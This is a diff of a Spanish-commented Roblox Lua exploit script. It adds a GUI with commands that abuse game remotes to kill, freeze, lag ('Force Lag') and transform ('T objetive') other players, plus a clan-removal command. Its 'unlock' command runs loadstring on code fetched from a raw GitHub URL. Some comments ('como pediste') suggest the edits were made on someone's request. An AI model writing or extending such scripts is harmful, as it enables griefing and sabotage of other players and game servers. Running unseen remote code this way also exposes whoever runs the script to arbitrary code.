@@ -89,7 +89,7 @@ InputFrame.Parent = ContentFrame
 local InputBox = Instance.new("TextBox")
 InputBox.Size = UDim2.new(0.9, 0, 0, 16)
 InputBox.Position = UDim2.new(0.05, 0, 0.1, 0)
-InputBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+InputBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 local uiGradientInput = Instance.new("UIGradient")
 uiGradientInput.Color = ColorSequence.new({
     ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 35, 35)),
@@ -97,9 +97,9 @@ uiGradientInput.Color = ColorSequence.new({
 })
 uiGradientInput.Rotation = 45
 uiGradientInput.Parent = InputBox
-InputBox.TextColor3 = Color3.fromRGB(255, 0, 0)
+InputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 InputBox.TextScaled = true
-InputBox.PlaceholderText = "???"
+InputBox.PlaceholderText = "Jugador"
 InputBox.Parent = InputFrame
 
 local InputCorner = Instance.new("UICorner")
@@ -109,7 +109,7 @@ InputCorner.Parent = InputBox
 -- ButtonsFrame para los comandos (resto del ContentFrame)
 local ButtonsFrame = Instance.new("Frame")
 ButtonsFrame.Name = "ButtonsFrame"
-ButtonsFrame.Size = UDim2.new(1, 0, 0, 110)  -- 130 - 20 = 110 px
+ButtonsFrame.Size = UDim2.new(1, 0, 0, 160)  -- subí 50 px como pediste
 ButtonsFrame.Position = UDim2.new(0, 0, 0, 20)
 ButtonsFrame.BackgroundTransparency = 1
 ButtonsFrame.Parent = ContentFrame
@@ -184,7 +184,7 @@ end)
 -- Función para obtener jugadores (coincidencia flexible)
 -------------------------------------------------------------------
 local function getPlayers(target)
-    local lowerTarget = string.lower(target)
+    local lowerTarget = string.lower(target or "")
     local matchedPlayers = {}
     if lowerTarget == "all" then
         return Players:GetPlayers()
@@ -210,11 +210,33 @@ local function getPlayers(target)
 end
 
 -------------------------------------------------------------------
+-- Función de efecto de partículas en botones
+-------------------------------------------------------------------
+local function spawnParticleEffect(button)
+    for i = 1, 5 do
+        local particle = Instance.new("ImageLabel")
+        particle.Size = UDim2.new(0, 6, 0, 6)
+        particle.Position = UDim2.new(0.5, 0, 0.5, 0)
+        particle.AnchorPoint = Vector2.new(0.5, 0.5)
+        particle.BackgroundTransparency = 1
+        particle.Image = "rbxassetid://2795790"
+        particle.ImageColor3 = Color3.new(math.random(), math.random(), math.random())
+        particle.Parent = button
+        local randomOffset = UDim2.new(0, math.random(-20,20), 0, math.random(-20,20))
+        local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+        local tween = TweenService:Create(particle, tweenInfo, {Position = randomOffset, ImageTransparency = 1})
+        tween:Play()
+        tween.Completed:Connect(function() particle:Destroy() end)
+    end
+end
+
+-------------------------------------------------------------------
 -- Función para ejecutar comandos
 -------------------------------------------------------------------
 local function executeCommand(command)
     local target = InputBox.Text
     local targetPlayers = getPlayers(target)
+
     for _, player in ipairs(targetPlayers) do
         if command == "bring" then
             if player.Character then
@@ -351,12 +373,12 @@ local function executeCommand(command)
             end
 
         elseif command == "noclans" then
-            local player = LocalPlayer
+            local playerLocal = LocalPlayer
             local Remote = ReplicatedStorage:WaitForChild("SS_Comunication"):WaitForChild("RemoveMember")
 
             local fixedString = "5yv260y391"
 
-            local hereFolder = player.PlayerGui:WaitForChild("PlayerInterface")
+            local hereFolder = playerLocal.PlayerGui:WaitForChild("PlayerInterface")
                                 :WaitForChild("Menu")
                                 :WaitForChild("Clans")
                                 :WaitForChild("Info")
@@ -372,30 +394,74 @@ local function executeCommand(command)
             end
 
         elseif command == "unlock" then
-            -- Nuevo comando unlock con loadstring
+            -- Nuevo comando unlock con loadstring (exactamente como pediste)
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Troll-Hub/LonelySC/refs/heads/main/Unlocker%201.0"))()
 
-        elseif command == "forcelag" then
-            -- Nuevo comando Force Lag con detección de nombres y posición dinámica
-            local targetPlayersForForceLag = getPlayers(target)
-            for _, targetPlayer in ipairs(targetPlayersForForceLag) do
-                if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        elseif command == "Force Lag" then
+            -- Force Lag: usa posición dinámica del objetivo y reemplaza DUMMY por el Character del objetivo
+            if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                local args = {
+                    [1] = true,
+                    [2] = LocalPlayer.Character,
+                    [3] = player.Character.HumanoidRootPart.Position,
+                    [4] = player.Character
+                }
+                ReplicatedStorage._BindableEvents.Moves.BreakStorm:FireServer(unpack(args))
+            else
+                StarterGui:SetCore("SendNotification", {
+                    Title = "Admin",
+                    Text = "El jugador objetivo no tiene personaje válido.",
+                    Duration = 2
+                })
+            end
+
+        elseif command == "T objetive" then
+            -- T objetive con contador leve y limpieza al finalizar
+            local targetName = InputBox.Text or ""
+            local lowerTarget = string.lower(targetName)
+            local alreadyExecuted = {}
+
+            local function runForPlayer(p)
+                if (lowerTarget == "others" or lowerTarget == "all") then
+                    if alreadyExecuted[p.UserId] then return end
+                    alreadyExecuted[p.UserId] = true
+                end
+
+                if p and p.Character and p.Status then
                     local args = {
-                        [1] = true,
-                        [2] = LocalPlayer.Character,
-                        [3] = targetPlayer.Character.HumanoidRootPart.Position,
-                        [4] = targetPlayer.Character
+                        [1] = {
+                            ["Humanoid"] = p.Character:FindFirstChild("Humanoid"),
+                            ["Head"] = p.Character:FindFirstChild("Head"),
+                            ["UpperTorso"] = p.Character:FindFirstChild("UpperTorso"),
+                            ["HumanoidRootPart"] = p.Character:FindFirstChild("HumanoidRootPart"),
+                            ["Character"] = p.Character
+                        },
+                        [2] = LocalPlayer.Status and LocalPlayer.Status.Mode,
+                        [3] = p.Status and p.Status.ModeActive,
+                        [4] = p.Status,
+                        [5] = false
                     }
 
-                    ReplicatedStorage._BindableEvents.Moves.BreakStorm:FireServer(unpack(args))
-                else
-                    StarterGui:SetCore("SendNotification", {
-                        Title = "Admin",
-                        Text = "Jugador " .. targetPlayer.Name .. " sin HumanoidRootPart.",
-                        Duration = 0.1
-                    })
+                    ReplicatedStorage._BindableEvents.Transform:InvokeServer(unpack(args))
                 end
             end
+
+            if lowerTarget == "all" or lowerTarget == "others" then
+                for _, p in ipairs(Players:GetPlayers()) do
+                    if p ~= LocalPlayer then
+                        runForPlayer(p)
+                    end
+                end
+            else
+                -- usar la misma detección flexible que getPlayers
+                local matched = getPlayers(targetName)
+                for _, p in ipairs(matched) do
+                    runForPlayer(p)
+                end
+            end
+
+            -- Limpiar registro para permitir ejecuciones futuras
+            alreadyExecuted = nil
         end
     end
 end
@@ -418,30 +484,9 @@ Players.PlayerAdded:Connect(function(player)
 end)
 
 -------------------------------------------------------------------
--- Efecto de partículas en botones
+-- Crear botones (todos los comandos)
 -------------------------------------------------------------------
-local function spawnParticleEffect(button)
-    for i = 1, 5 do
-        local particle = Instance.new("ImageLabel")
-        particle.Size = UDim2.new(0, 6, 0, 6)
-        particle.Position = UDim2.new(0.5, 0, 0.5, 0)
-        particle.AnchorPoint = Vector2.new(0.5, 0.5)
-        particle.BackgroundTransparency = 0
-        particle.Image = "rbxassetid://2795790"
-        particle.ImageColor3 = Color3.new(math.random(), math.random(), math.random())
-        particle.Parent = button
-        local randomOffset = UDim2.new(0, math.random(-20,20), 0, math.random(-20,20))
-        local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-        local tween = TweenService:Create(particle, tweenInfo, {Position = randomOffset, ImageTransparency = 0})
-        tween:Play()
-        tween.Completed:Connect(function() particle:Destroy() end)
-    end
-end
-
--------------------------------------------------------------------
--- Crear botones (sin tg y sk, con noclans)
--------------------------------------------------------------------
-local commands = {"bring","kill","heal","punish","unpunish","freeze","unfreeze","to","b1","hk","noclans","permGod","Killer", "frm", "unlock", "forcelag"}
+local commands = {"bring","kill","heal","punish","unpunish","freeze","unfreeze","to","b1","hk","unlock","Force Lag","T objetive"}
 for _, cmd in ipairs(commands) do
     local button = Instance.new("TextButton")
     button.BackgroundColor3 = Color3.fromRGB(230,230,230)
@@ -464,7 +509,7 @@ for _, cmd in ipairs(commands) do
         StarterGui:SetCore("SendNotification", {
             Title="Admin",
             Text="Comando ejecutado: "..cmd:upper(),
-            Duration=0.5
+            Duration=2
         })
     end)
 end
